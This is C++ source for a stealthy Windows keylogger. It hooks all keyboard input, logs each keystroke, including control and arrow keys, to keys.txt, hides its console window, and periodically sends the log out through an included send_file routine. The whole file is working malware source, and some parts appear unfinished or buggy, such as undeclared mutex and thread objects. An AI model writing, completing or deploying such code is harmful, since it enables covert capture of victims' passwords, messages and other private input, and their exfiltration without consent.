#define _WIN32_WINNT 0x0500
#include <fstream>

#include "file_send.cpp"
#include "timer.cpp"

#include <windows.h>

using namespace std;

extern int counter;
extern fd_set write_fds;

string buffer = "";
ofstream out;

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

    // If key is being pressed
    if (wParam == WM_KEYDOWN)
    {
        switch (p->vkCode)
        {
        // Invisible keys
        case VK_CAPITAL:
            buffer += "<CAPLOCK>";
            break;
        case VK_SHIFT:
            buffer += "<SHIFT>";
            break;
        case VK_LCONTROL:
            buffer += "<LCTRL>";
            break;
        case VK_RCONTROL:
            buffer += "<RCTRL>";
            break;
        case VK_INSERT:
            buffer += "<INSERT>";
            break;
        case VK_END:
            buffer += "<END>";
            break;
        case VK_PRINT:
            buffer += "<PRINT>";
            break;
        case VK_DELETE:
            buffer += "<DEL>";
            break;
        case VK_BACK:
            buffer += "<BK>";
            break;
        case VK_LEFT:
            buffer += "<LEFT>";
            break;
        case VK_RIGHT:
            buffer += "<RIGHT>";
            break;
        case VK_UP:
            buffer += "<UP>";
            break;
        case VK_DOWN:
            buffer += "<DOWN>";
            break;
        // Visible keys
        default:
            buffer += char(tolower(p->vkCode));
        }
    }

    if(mtx.lock()) {
        if (counter % 18 == 0){
            string filename = "";
            send_file("./keys.txt");
        }

        else if (counter % 6 == 0){
            out.open("./keys.txt", ios::out);
            out << buffer;

            buffer = "";

            out.close();
        }
       
        mtx.unlock();

        sleep(1);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{

    HWND stealth; /*creating stealth (window is not visible)*/
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    std::thread th(tick);
    
    // Set windows hook
    HHOOK keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        keyboardHookProc,
        hInstance,
        0);

    MSG messages;

    while (GetMessage(&messages, NULL, 0, 0))
    {
        /* Translate virtual-key messages into character messages */
        TranslateMessage(&messages);
        /* Send message to WindowProcedure */
        DispatchMessage(&messages);
    }

    return 0;
}